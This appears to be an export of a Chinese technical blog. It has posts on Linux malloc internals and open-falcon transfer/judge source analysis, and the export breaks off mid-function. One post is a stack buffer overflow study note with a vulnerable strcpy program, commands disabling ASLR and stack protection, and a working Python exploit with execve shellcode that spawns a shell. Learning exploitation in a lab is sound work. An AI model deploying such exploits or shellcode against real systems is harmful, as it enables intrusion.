[{"title":"Linux Malloc底层分配原理【翻译】","url":"/2020/01/24/linux内存malloc底层实现/","content":"\n## Linux Malloc底层分配原理【翻译】\n\nlinux中malloc函数还是通过syscall来分配内存的。通过调用brk或者mmap syscall函数来分配内存。\n\n![img](https://docs.google.com/drawings/d/105HDvkEvIW2lsyaQjj758Lbyx6A-_K7jviheyzeAwl8/pub?w=480&h=238)\n\nbrk函数：从内核分配内存（非0初始化）通过增加程序break位置来实现。初始化堆segment得开始与结束指向相同的位置。\n\n如果ASLR关闭的时候，start_brk和brk将指向data/bss segment结束的位置。\n\n如果ASLR打开的时候，start_brk和brk将等于data/bss segment结束的位置通过随机brk offset\n\n![img](https://i2.wp.com/static.duartes.org/img/blogPosts/linuxFlexibleAddressSpaceLayout.png)\n\nmmap: malloc函数使用mmap来创建一个私有匿名映射segment.分配私有匿名的主要目的是分配一个新的内存（0填充的）这个新的内存将被调用进程的时候额外使用。\n\n\n\n### 参考\n\nhttps://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/\n\nhttps://manybutfinite.com/post/anatomy-of-a-program-in-memory/\n\n\n\n","tags":["malloc"],"categories":["malloc"]},{"title":"pwn学习笔记1","url":"/2020/01/23/pwn学习笔记/","content":"\n## pwn学习笔记1\n\n### 学习笔记\n\n其实参考的是https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/文章中的教程，学习下pwn的基础知识。\n\n环境：ubuntu14.04\n\n漏洞代码：\n\n```c\n//vuln.c\n#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char* argv[]) {\n        /* [1] */ char buf[256];\n        /* [2] */ strcpy(buf,argv[1]);\n        /* [3] */ printf(\"Input:%s\\n\",buf);\n        return 0;\n}\n```\n\n其实就是简单的栈溢出利用，超过256个字符的时候会发生栈溢出问题。\n\n首先我们需要关闭内存地址随机化。保证栈溢出地址固定。\n\n```ruby\necho 0 > /proc/sys/kernel/randomize_va_space\n```\n\n编译和打开栈执行\n\n```\ngcc -g -fno-stack-protector -z execstack -o vul1 vul1.c\nchmod +s vul1\n```\n\ngdb调试：\n\n```shell\nsaar@saar-virtual-machine:~/pwn$ gdb vul1 \nGNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.3) 7.7.1\nCopyright (C) 2014 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.  Type \"show copying\"\nand \"show warranty\" for details.\nThis GDB was configured as \"i686-linux-gnu\".\nType \"show configuration\" for configuration details.\nFor bug reporting instructions, please see:\n<http://www.gnu.org/software/gdb/bugs/>.\nFind the GDB manual and other documentation resources online at:\n<http://www.gnu.org/software/gdb/documentation/>.\nFor help, type \"help\".\nType \"apropos word\" to search for commands related to \"word\"...\nReading symbols from vul1...done.\ngdb-peda$ dis\ndisable      disassemble  disconnect   display      distance     \ngdb-peda$ disassemble main\nDump of assembler code for function main:\n   0x0804844d <+0>:     push   ebp\n   0x0804844e <+1>:     mov    ebp,esp\n   0x08048450 <+3>:     and    esp,0xfffffff0\n   0x08048453 <+6>:     sub    esp,0x110\n   0x08048459 <+12>:    mov    eax,DWORD PTR [ebp+0xc]\n   0x0804845c <+15>:    add    eax,0x4\n   0x0804845f <+18>:    mov    eax,DWORD PTR [eax]\n   0x08048461 <+20>:    mov    DWORD PTR [esp+0x4],eax\n   0x08048465 <+24>:    lea    eax,[esp+0x10]\n   0x08048469 <+28>:    mov    DWORD PTR [esp],eax\n   0x0804846c <+31>:    call   0x8048320 <strcpy@plt>\n   0x08048471 <+36>:    lea    eax,[esp+0x10]\n   0x08048475 <+40>:    mov    DWORD PTR [esp+0x4],eax\n   0x08048479 <+44>:    mov    DWORD PTR [esp],0x8048520\n   0x08048480 <+51>:    call   0x8048310 <printf@plt>\n   0x08048485 <+56>:    mov    eax,0x0\n   0x0804848a <+61>:    leave  \n   0x0804848b <+62>:    ret    \nEnd of assembler dump.\ngdb-peda$ r `python -c 'print \"A\"*400'`\nStarting program: /home/saar/pwn/vul1 `python -c 'print \"A\"*400'`\nInput:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\nProgram received signal SIGSEGV, Segmentation fault.\n[----------------------------------registers-----------------------------------]\nEAX: 0x0 \nEBX: 0xb7fc0000 --> 0x1acda8 \nECX: 0x0 \nEDX: 0xb7fc1898 --> 0x0 \nESI: 0x0 \nEDI: 0x0 \nEBP: 0x41414141 ('AAAA')\nESP: 0xbffff460 ('A' <repeats 128 times>)\nEIP: 0x41414141 ('AAAA')\nEFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\nInvalid $PC address: 0x41414141\n[------------------------------------stack-------------------------------------]\n0000| 0xbffff460 ('A' <repeats 128 times>)\n0004| 0xbffff464 ('A' <repeats 124 times>)\n0008| 0xbffff468 ('A' <repeats 120 times>)\n0012| 0xbffff46c ('A' <repeats 116 times>)\n0016| 0xbffff470 ('A' <repeats 112 times>)\n0020| 0xbffff474 ('A' <repeats 108 times>)\n0024| 0xbffff478 ('A' <repeats 104 times>)\n0028| 0xbffff47c ('A' <repeats 100 times>)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x41414141 in ?? ()\n```\n\nesp 地址是：0xbffff460，\n\n发现ret_address需要保证esp+N<nop的数目\n\n```python\n#exp.py \n#!/usr/bin/env python\nimport struct\nfrom subprocess import call\n\n#Stack address where shellcode is copied.\nret_addr = 0xbffff480      \n              \n#Spawn a shell\n#execve(/bin/sh)\nscode = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"\n\n#endianess convertion\ndef conv(num):\n return struct.pack(\"<I\",num)\n\n# buf = Junk + RA + NOP's + Shellcode\nbuf = \"A\" * 268\nbuf += conv(ret_addr)\nbuf += \"\\x90\" * 40\nbuf += scode\n\nprint \"Calling vulnerable program\"\ncall([\"./vul1\", buf])\n```\n\n最后获取shell:\n\n```shell\nsaar@saar-virtual-machine:~/pwn$ python exp.py \nCalling vulnerable program\nInput:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1/shh/bin\n\n$ \n$ id\nuid=1000(saar) gid=1000(saar) groups=1000(saar),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)\n$ \n```\n\n\n\n### 参考\n\nhttps://www.jianshu.com/p/187b810e78d2\n\nhttps://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/","tags":["pwn"],"categories":["pwn"]},{"title":"open-falcon transfer 源码分析","url":"/2020/01/21/transfer源码分析/","content":"## open-falcon transfer 源码分析\n\ntransfer模块是小米监控中比较重要的环境，主要用于发送数据给graph,judge,等。\n\n主要流程在modules/transfer/main.go\n\n```go\nfunc main() {\n\tg.BinaryName = BinaryName\n\tg.Version = Version\n\tg.GitCommit = GitCommit\n\n\tcfg := flag.String(\"c\", \"cfg.json\", \"configuration file\")\n\tversion := flag.Bool(\"v\", false, \"show version\")\n\tversionGit := flag.Bool(\"vg\", false, \"show version\")\n\tflag.Parse()\n\n\tif *version {\n\t\tfmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit)\n\t\tos.Exit(0)\n\t}\n\tif *versionGit {\n\t\tfmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit)\n\t\tos.Exit(0)\n\t}\n\n\t// global config\n    // 解析配置文件\n\tg.ParseConfig(*cfg)\n\t// proc\n    // 就是打印日志。。orz\n\tproc.Start()\n\n    // 发送端启动\n\tsender.Start()\n    // 接收数据启动\n\treceiver.Start()\n\n\t// http\n    //  http服务启动\n\thttp.Start()\n\n\tselect {}\n}\n```\n\n先来看下发送端的代码：\n\n```go\n// 初始化数据发送服务, 在main函数中调用\nfunc Start() {\n\t// 初始化默认参数\n\tMinStep = g.Config().MinStep\n\tif MinStep < 1 {\n\t\tMinStep = 30 //默认30s\n\t}\n\t//初始化连接池\n\tinitConnPools()\n    //初始化发送队列\n\tinitSendQueues()\n\t//初始化hash环，用于做一致性hash分片\n    initNodeRings()\n\t// SendTasks依赖基础组件的初始化,要最后启动\n\tstartSendTasks()\n    //启动发送定时任务\n\tstartSenderCron()\n\tlog.Println(\"send.Start, ok\")\n}\n```\n\n```go\nfunc initConnPools() {\n\tcfg := g.Config()\n\n\t// judge\n    // 读取配置文件，加载进来\n\tjudgeInstances := nset.NewStringSet()\n\tfor _, instance := range cfg.Judge.Cluster {\n\t\tjudgeInstances.Add(instance)\n\t}\n\tJudgeConnPools = backend.CreateSafeRpcConnPools(cfg.Judge.MaxConns, cfg.Judge.MaxIdle,\n\t\tcfg.Judge.ConnTimeout, cfg.Judge.CallTimeout, judgeInstances.ToSlice())\n\n\t// tsdb，是否开启tsdb，初始化\n\tif cfg.Tsdb.Enabled {\n\t\tTsdbConnPoolHelper = backend.NewTsdbConnPoolHelper(cfg.Tsdb.Address, cfg.Tsdb.MaxConns, cfg.Tsdb.MaxIdle, cfg.Tsdb.ConnTimeout, cfg.Tsdb.CallTimeout)\n\t}\n\n\t// graph\n    // graph地址初始化\n\tgraphInstances := nset.NewSafeSet()\n\tfor _, nitem := range cfg.Graph.ClusterList {\n\t\tfor _, addr := range nitem.Addrs {\n\t\t\tgraphInstances.Add(addr)\n\t\t}\n\t}\n\tGraphConnPools = backend.CreateSafeRpcConnPools(cfg.Graph.MaxConns, cfg.Graph.MaxIdle,\n\t\tcfg.Graph.ConnTimeout, cfg.Graph.CallTimeout, graphInstances.ToSlice())\n\n}\n```\n\n初始化发送队列：\n\n```go\n\nfunc initSendQueues() {\n\tcfg := g.Config()\n    // 对每个judge节点构建一个队列\n\tfor node := range cfg.Judge.Cluster {\n\t\tQ := nlist.NewSafeListLimited(DefaultSendQueueMaxSize)\n\t\tJudgeQueues[node] = Q\n\t}\n\t// 对每个graph节点构建一个队列\n\tfor node, nitem := range cfg.Graph.ClusterList {\n\t\tfor _, addr := range nitem.Addrs {\n\t\t\tQ := nlist.NewSafeListLimited(DefaultSendQueueMaxSize)\n\t\t\tGraphQueues[node+addr] = Q\n\t\t}\n\t}\n\t// 对tsdb节点构建队列\n\tif cfg.Tsdb.Enabled {\n\t\tTsdbQueue = nlist.NewSafeListLimited(DefaultSendQueueMaxSize)\n\t}\n}\n```\n\ninitNodeRings构建hash环，用于一致性hash初始化。\n\n```go\nfunc initNodeRings() {\n\tcfg := g.Config()\n\n\tJudgeNodeRing = rings.NewConsistentHashNodesRing(int32(cfg.Judge.Replicas), cutils.KeysOfMap(cfg.Judge.Cluster))\n\tGraphNodeRing = rings.NewConsistentHashNodesRing(int32(cfg.Graph.Replicas), cutils.KeysOfMap(cfg.Graph.Cluster))\n}\n```\n\nstartSendTasks函数启动发送任务：\n\n```go\n// TODO 添加对发送任务的控制,比如stop等\nfunc startSendTasks() {\n\tcfg := g.Config()\n\t// init semaphore\n\tjudgeConcurrent := cfg.Judge.MaxConns\n\tgraphConcurrent := cfg.Graph.MaxConns\n\ttsdbConcurrent := cfg.Tsdb.MaxConns\n\n\tif tsdbConcurrent < 1 {\n\t\ttsdbConcurrent = 1\n\t}\n\n\tif judgeConcurrent < 1 {\n\t\tjudgeConcurrent = 1\n\t}\n\n\tif graphConcurrent < 1 {\n\t\tgraphConcurrent = 1\n\t}\n\n\t// init send go-routines\n\tfor node := range cfg.Judge.Cluster {\n\t\tqueue := JudgeQueues[node]\n\t\tgo forward2JudgeTask(queue, node, judgeConcurrent)\n\t}\n\n\tfor node, nitem := range cfg.Graph.ClusterList {\n\t\tfor _, addr := range nitem.Addrs {\n\t\t\tqueue := GraphQueues[node+addr]\n\t\t\tgo forward2GraphTask(queue, node, addr, graphConcurrent)\n\t\t}\n\t}\n\n\tif cfg.Tsdb.Enabled {\n\t\tgo forward2TsdbTask(tsdbConcurrent)\n\t}\n}\n```\n\nforward2JudgeTask函数用于启动judge发送任务：\n\n```go\n// Judge定时任务, 将 Judge发送缓存中的数据 通过rpc连接池 发送到Judge\nfunc forward2JudgeTask(Q *list.SafeListLimited, node string, concurrent int) {\n\tbatch := g.Config().Judge.Batch // 一次发送,最多batch条数据\n\taddr := g.Config().Judge.Cluster[node]\n\tsema := nsema.NewSemaphore(concurrent)\n\n\tfor {\n\t\titems := Q.PopBackBy(batch)\n\t\tcount := len(items)\n\t\tif count == 0 {\n\t\t\ttime.Sleep(DefaultSendTaskSleepInterval)\n\t\t\tcontinue\n\t\t}\n\n\t\tjudgeItems := make([]*cmodel.JudgeItem, count)\n\t\tfor i := 0; i < count; i++ {\n\t\t\tjudgeItems[i] = items[i].(*cmodel.JudgeItem)\n\t\t}\n\n\t\t//\t同步Call + 有限并发 进行发送\n\t\tsema.Acquire()\n\t\tgo func(addr string, judgeItems []*cmodel.JudgeItem, count int) {\n\t\t\tdefer sema.Release()\n\n\t\t\tresp := &cmodel.SimpleRpcResponse{}\n\t\t\tvar err error\n\t\t\tsendOk := false\n\t\t\tfor i := 0; i < 3; i++ { //最多重试3次\n                // 调用judge rpc send接口发送数据\n\t\t\t\terr = JudgeConnPools.Call(addr, \"Judge.Send\", judgeItems, resp)\n\t\t\t\tif err == nil {\n\t\t\t\t\tsendOk = true\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t\ttime.Sleep(time.Millisecond * 10)\n\t\t\t}\n\n\t\t\t// statistics\n\t\t\tif !sendOk {\n\t\t\t\tlog.Printf(\"send judge %s:%s fail: %v\", node, addr, err)\n\t\t\t\tproc.SendToJudgeFailCnt.IncrBy(int64(count))\n\t\t\t} else {\n\t\t\t\tproc.SendToJudgeCnt.IncrBy(int64(count))\n\t\t\t}\n\t\t}(addr, judgeItems, count)\n\t}\n}\n```\n\nforward2GraphTask启动发送存档数据：\n\n```go\n// Graph定时任务, 将 Graph发送缓存中的数据 通过rpc连接池 发送到Graph\nfunc forward2GraphTask(Q *list.SafeListLimited, node string, addr string, concurrent int) {\n\tbatch := g.Config().Graph.Batch // 一次发送,最多batch条数据\n\tsema := nsema.NewSemaphore(concurrent)\n\n\tfor {\n\t\titems := Q.PopBackBy(batch) //从队列中pop指定大小的数据\n\t\tcount := len(items)\n\t\tif count == 0 {\n\t\t\ttime.Sleep(DefaultSendTaskSleepInterval)\n\t\t\tcontinue\n\t\t}\n\n\t\tgraphItems := make([]*cmodel.GraphItem, count)\n\t\tfor i := 0; i < count; i++ {\n\t\t\tgraphItems[i] = items[i].(*cmodel.GraphItem)\n\t\t}\n\n\t\tsema.Acquire()\n\t\tgo func(addr string, graphItems []*cmodel.GraphItem, count int) {\n\t\t\tdefer sema.Release()\n\n\t\t\tresp := &cmodel.SimpleRpcResponse{}\n\t\t\tvar err error\n\t\t\tsendOk := false\n\t\t\tfor i := 0; i < 3; i++ { //最多重试3次\n                // 给graph接口发送数据\n\t\t\t\terr = GraphConnPools.Call(addr, \"Graph.Send\", graphItems, resp)\n\t\t\t\tif err == nil {\n\t\t\t\t\tsendOk = true\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t\ttime.Sleep(time.Millisecond * 10)\n\t\t\t}\n\n\t\t\t// statistics\n            //   统计数据，方便后续排查当前队列中发送失败和成功数据量\n\t\t\tif !sendOk {\n\t\t\t\tlog.Printf(\"send to graph %s:%s fail: %v\", node, addr, err)\n\t\t\t\tproc.SendToGraphFailCnt.IncrBy(int64(count))\n\t\t\t} else {\n\t\t\t\tproc.SendToGraphCnt.IncrBy(int64(count))\n\t\t\t}\n\t\t}(addr, graphItems, count)\n\t}\n}\n```\n\n如果有使用tsdb的话，启动tsdb发送task，这边不说了，基本流程类似。\n\n```go\n// Tsdb定时任务, 将数据通过api发送到tsdb\nfunc forward2TsdbTask(concurrent int) {\n\tbatch := g.Config().Tsdb.Batch // 一次发送,最多batch条数据\n\tretry := g.Config().Tsdb.MaxRetry\n\tsema := nsema.NewSemaphore(concurrent)\n\n\tfor {\n\t\titems := TsdbQueue.PopBackBy(batch)\n\t\tif len(items) == 0 {\n\t\t\ttime.Sleep(DefaultSendTaskSleepInterval)\n\t\t\tcontinue\n\t\t}\n\t\t//  同步Call + 有限并发 进行发送\n\t\tsema.Acquire()\n\t\tgo func(itemList []interface{}) {\n\t\t\tdefer sema.Release()\n\n\t\t\tvar tsdbBuffer bytes.Buffer\n\t\t\tcount := len(itemList)\n\t\t\tfor i := 0; i < count; i++ {\n\t\t\t\ttsdbItem := itemList[i].(*cmodel.TsdbItem)\n\t\t\t\ttsdbBuffer.WriteString(tsdbItem.TsdbString())\n\t\t\t\ttsdbBuffer.WriteString(\"\\n\")\n\t\t\t}\n\n\t\t\tvar err error\n\t\t\tfor i := 0; i < retry; i++ {\n\t\t\t\terr = TsdbConnPoolHelper.Send(tsdbBuffer.Bytes())\n\t\t\t\tif err == nil {\n\t\t\t\t\tproc.SendToTsdbCnt.IncrBy(int64(len(itemList)))\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t\ttime.Sleep(100 * time.Millisecond)\n\t\t\t}\n\n\t\t\tif err != nil {\n\t\t\t\tproc.SendToTsdbFailCnt.IncrBy(int64(len(itemList)))\n\t\t\t\tlog.Println(err)\n\t\t\t\treturn\n\t\t\t}\n\t\t}(items)\n\t}\n}\n```\n\n接下来函数startSenderCron函数中：\n\n```go\n// send_cron程序入口\nfunc startSenderCron() {\n\tgo startProcCron()  //发送队列统计\n\tgo startLogCron()    //打印日志\n}\n```\n\n发送队列统计数据\n\n```go\nfunc calcSendCacheSize(mapList map[string]*list.SafeListLimited) int64 {\n\tvar cnt int64 = 0\n\tfor _, list := range mapList {\n\t\tif list != nil {\n\t\t\tcnt += int64(list.Len())\n\t\t}\n\t}\n\treturn cnt\n}\n```\n\n接收数据函数\n\n```go\nfunc Start() {\n\tgo rpc.StartRpc()                // rpc接口数据，接收数据\n\tgo socket.StartSocket()          // tcp方式推送数据\n}\n```\n\n 主要看rpc接口，因为socket方式也是小米提供的，底层传输的方法一样。\n\nrpc update接口用于更新数据并打到缓存队列中去，update方法最终调用RecvMetricValues函数：\n\n```go\n// process new metric values\nfunc RecvMetricValues(args []*cmodel.MetricValue, reply *cmodel.TransferResponse, from string) error {\n\tstart := time.Now()\n\treply.Invalid = 0\n\n\titems := []*cmodel.MetaData{}\n\tfor _, v := range args {\n\t\tif v == nil {\n\t\t\treply.Invalid += 1\n\t\t\tcontinue\n\t\t}\n\n\t\t// 历史遗留问题.\n\t\t// 老版本agent上报的metric=kernel.hostname的数据,其取值为string类型,现在已经不支持了;所以,这里硬编码过滤掉\n        \n        // 很多的过滤策略。\n\t\tif v.Metric == \"kernel.hostname\" {\n\t\t\treply.Invalid += 1\n\t\t\tcontinue\n\t\t}\n\n\t\tif v.Metric == \"\" || v.Endpoint == \"\" {\n\t\t\treply.Invalid += 1\n\t\t\tcontinue\n\t\t}\n\n\t\tif v.Type != g.COUNTER && v.Type != g.GAUGE && v.Type != g.DERIVE {\n\t\t\treply.Invalid += 1\n\t\t\tcontinue\n\t\t}\n\n\t\tif v.Value == \"\" {\n\t\t\treply.Invalid += 1\n\t\t\tcontinue\n\t\t}\n\n\t\tif v.Step <= 0 {\n\t\t\treply.Invalid += 1\n\t\t\tcontinue\n\t\t}\n\n\t\tif len(v.Metric)+len(v.Tags) > 510 {\n\t\t\treply.Invalid += 1\n\t\t\tcontinue\n\t\t}\n\n\t\t// TODO 呵呵,这里需要再优雅一点\n\t\tnow := start.Unix()\n\t\tif v.Timestamp <= 0 || v.Timestamp > now*2 {\n\t\t\tv.Timestamp = now\n\t\t}\n\n\t\tfv := &cmodel.MetaData{\n\t\t\tMetric:      v.Metric,\n\t\t\tEndpoint:    v.Endpoint,\n\t\t\tTimestamp:   v.Timestamp,\n\t\t\tStep:        v.Step,\n\t\t\tCounterType: v.Type,\n\t\t\tTags:        cutils.DictedTagstring(v.Tags), //TODO tags键值对的个数,要做一下限制\n\t\t}\n\n\t\tvalid := true\n\t\tvar vv float64\n\t\tvar err error\n\n\t\tswitch cv := v.Value.(type) {\n\t\tcase string:\n\t\t\tvv, err = strconv.ParseFloat(cv, 64)\n\t\t\tif err != nil {\n\t\t\t\tvalid = false\n\t\t\t}\n\t\tcase float64:\n\t\t\tvv = cv\n\t\tcase int64:\n\t\t\tvv = float64(cv)\n\t\tdefault:\n\t\t\tvalid = false\n\t\t}\n\n\t\tif !valid {\n\t\t\treply.Invalid += 1\n\t\t\tcontinue\n\t\t}\n\n\t\tfv.Value = vv\n\t\titems = append(items, fv)\n\t}\n\n\t// statistics\n\tcnt := int64(len(items))\n\tproc.RecvCnt.IncrBy(cnt)\n    // 统计\n\tif from == \"rpc\" {\n\t\tproc.RpcRecvCnt.IncrBy(cnt)\n\t} else if from == \"http\" {\n\t\tproc.HttpRecvCnt.IncrBy(cnt)\n\t}\n\n\tcfg := g.Config()\n\n    //   打到对应的缓存队列中去。\n\tif cfg.Graph.Enabled {\n\t\tsender.Push2GraphSendQueue(items)\n\t}\n\n\tif cfg.Judge.Enabled {\n\t\tsender.Push2JudgeSendQueue(items)\n\t}\n\n\tif cfg.Tsdb.Enabled {\n\t\tsender.Push2TsdbSendQueue(items)\n\t}\n\n\treply.Message = \"ok\"\n\treply.Total = len(args)\n\treply.Latency = (time.Now().UnixNano() - start.UnixNano()) / 1000000\n\n\treturn nil\n}\n```\n\n函数push2GraphSendQueue函数：\n\n```go\n// 将数据 打入 某个Graph的发送缓存队列, 具体是哪一个Graph 由一致性哈希 决定\nfunc Push2GraphSendQueue(items []*cmodel.MetaData) {\n\tcfg := g.Config().Graph\n\n\tfor _, item := range items {\n        // 转换数据\n\t\tgraphItem, err := convert2GraphItem(item)\n\t\tif err != nil {\n\t\t\tlog.Println(\"E:\", err)\n\t\t\tcontinue\n\t\t}\n\t\tpk := item.PK()\n\n\t\t// statistics. 为了效率,放到了这里,因此只有graph是enbale时才能trace\n\t\tproc.RecvDataTrace.Trace(pk, item)\n\t\tproc.RecvDataFilter.Filter(pk, item.Value, item)\n\t\t// 得到对应的一致性hash分片节点\n\t\tnode, err := GraphNodeRing.GetNode(pk)\n\t\tif err != nil {\n\t\t\tlog.Println(\"E:\", err)\n\t\t\tcontinue\n\t\t}\n\n\t\tcnode := cfg.ClusterList[node]\n\t\terrCnt := 0\n\t\tfor _, addr := range cnode.Addrs {\n\t\t\tQ := GraphQueues[node+addr]\n             // 获取队列并推送到缓存队列中去\n\t\t\tif !Q.PushFront(graphItem) {\n\t\t\t\terrCnt += 1\n\t\t\t}\n\t\t}\n\n\t\t// statistics\n\t\tif errCnt > 0 {\n\t\t\tproc.SendToGraphDropCnt.Incr()\n\t\t}\n\t}\n}\n```\n\n其他两个函数基本类似，都是使用这种方式来将数据推送的内存队列中，然后使用send task 任务发送出去。队列不会堆积，因为发送的时候会出队，不过这样如果发送三次还是失败，这个数据就丢失了。。只能通过统计数据来定位了。\n\n\n\n\n\n","tags":["monitor"],"categories":["monitor"]},{"title":"open-falcon judge 源码分析","url":"/2020/01/21/judge源码分析/","content":"## open-falcon judge源码分析\n\njudge模块主要流程在modules/judge/main\n\n```go\nfunc main() {\n\tg.BinaryName = BinaryName\n\tg.Version = Version\n\tg.GitCommit = GitCommit\n\n\tcfg := flag.String(\"c\", \"cfg.json\", \"configuration file\")\n\tversion := flag.Bool(\"v\", false, \"show version\")\n\tflag.Parse()\n\n\tif *version {\n\t\tfmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit)\n\t\tos.Exit(0)\n\t}\n\t//解析配置文件\n\tg.ParseConfig(*cfg)\n\t// 初始化数据库连接池\n\tg.InitRedisConnPool()\n    // 初始化HBS客户端\n\tg.InitHbsClient()\n\t//初始化存储，初始化内存BigMap，存储采集历史数据\n\tstore.InitHistoryBigMap()\n\t//http服务启动\n\tgo http.Start()\n    // rpc服务启动\n\tgo rpc.Start()\n\t//定时从HBS同步策略\n\tgo cron.SyncStrategies()\n    //清理无效数据\n\tgo cron.CleanStale()\n\n\tselect {}\n}\n```\n\nhttp服务接口数据，注册route:\n\n```go\nfunc init() {\n\tconfigCommonRoutes()\n\tconfigInfoRoutes()\n}\n```\n\n再看下rpc接口，judge主要有Send函数来做：\n\n```go\nfunc (this *Judge) Send(items []*model.JudgeItem, resp *model.SimpleRpcResponse) error {\n\tremain := g.Config().Remain\n\t// 把当前时间的计算放在最外层，是为了减少获取时间时的系统调用开销\n\tnow := time.Now().Unix()\n\tfor _, item := range items {\n\t\texists := g.FilterMap.Exists(item.Metric)\n\t\tif !exists {\n\t\t\tcontinue\n\t\t}\n\t\tpk := item.PrimaryKey()\n        // 接收数据，将数据放到bigMap中去\n\t\tstore.HistoryBigMap[pk[0:2]].PushFrontAndMaintain(pk, item, remain, now)\n\t}\n\treturn nil\n}\n```\n\n函数推送\n\n```go\n\nfunc (this *JudgeItemMap) PushFrontAndMaintain(key string, val *model.JudgeItem, maxCount int, now int64) {\n    // 如果这个keys存在了则压入队列，如果不存在放入队列之后调用judge函数判断\n\tif linkedList, exists := this.Get(key); exists {\n\t\tneedJudge := linkedList.PushFrontAndMaintain(val, maxCount)\n\t\tif needJudge {\n\t\t\tJudge(linkedList, val, now)\n\t\t}\n\t} else {\n\t\tNL := list.New()\n\t\tNL.PushFront(val)\n\t\tsafeList := &SafeLinkedList{L: NL}\n\t\tthis.Set(key, safeList)\n\t\tJudge(safeList, val, now)\n\t}\n}\n```\n\n检查Strategy和expression:\n\n```go\nfunc Judge(L *SafeLinkedList, firstItem *model.JudgeItem, now int64) {\n\tCheckStrategy(L, firstItem, now)\n\tCheckExpression(L, firstItem, now)\n}\n```\n\n```go\nfunc CheckStrategy(L *SafeLinkedList, firstItem *model.JudgeItem, now int64) {\n\tkey := fmt.Sprintf(\"%s/%s\", firstItem.Endpoint, firstItem.Metric)\n\tstrategyMap := g.StrategyMap.Get()\n\tstrategies, exists := strategyMap[key]\n\tif !exists {\n\t\treturn\n\t}\n\n\tfor _, s := range strategies {\n\t\t// 因为key仅仅是endpoint和metric，所以得到的strategies并不一定是与当前judgeItem相关的\n\t\t// 比如lg-dinp-docker01.bj配置了两个proc.num的策略，一个name=docker，一个name=agent\n\t\t// 所以此处要排除掉一部分\n\t\trelated := true\n\t\tfor tagKey, tagVal := range s.Tags {\n\t\t\tif myVal, exists := firstItem.Tags[tagKey]; !exists || myVal != tagVal {\n\t\t\t\trelated = false\n\t\t\t\tbreak\n\t\t\t}\n\t\t}\n\t\t// 查找到相关的指标，然后judge对应的策略\n\t\tif !related {\n\t\t\tcontinue\n\t\t}\n\n\t\tjudgeItemWithStrategy(L, s, firstItem, now)\n\t}\n}\n```\n\njudgeItemWithStrategy函数寻找相应的策略：\n\n```go\nfunc judgeItemWithStrategy(L *SafeLinkedList, strategy model.Strategy, firstItem *model.JudgeItem, now int64) {\n\tfn, err := ParseFuncFromString(strategy.Func, strategy.Operator, strategy.RightValue)\n\tif err != nil {\n\t\tlog.Printf(\"[ERROR] parse func %s fail: %v. strategy id: %d\", strategy.Func, err, strategy.Id)\n\t\treturn\n\t}\n\t//判断是否需要触发，如果满足条件，则发送事件\n\thistoryData, leftValue, isTriggered, isEnough := fn.Compute(L)\n\tif !isEnough {\n\t\treturn\n\t}\n\n\tevent := &model.Event{\n\t\tId:         fmt.Sprintf(\"s_%d_%s\", strategy.Id, firstItem.PrimaryKey()),\n\t\tStrategy:   &strategy,\n\t\tEndpoint:   firstItem.Endpoint,\n\t\tLeftValue:  leftValue,\n\t\tEventTime:  firstItem.Timestamp,\n\t\tPushedTags: firstItem.Tags,\n\t}\n\t// 发送事件\n\tsendEventIfNeed(historyData, isTriggered, now, event, strategy.MaxStep)\n}\n```\n\n```go\nfunc sendEventIfNeed(historyData []*model.HistoryData, isTriggered bool, now int64, event *model.Event, maxStep int) {\n\tlastEvent, exists := g.LastEvents.Get(event.Id)\n\tif isTriggered {\n\t\tevent.Status = \"PROBLEM\"\n\t\tif !exists || lastEvent.Status[0] == 'O' {\n\t\t\t// 本次触发了阈值，之前又没报过警，得产生一个报警Event\n\t\t\tevent.CurrentStep = 1\n\n\t\t\t// 但是有些用户把最大报警次数配置成了0，相当于屏蔽了，要检查一下\n\t\t\tif maxStep == 0 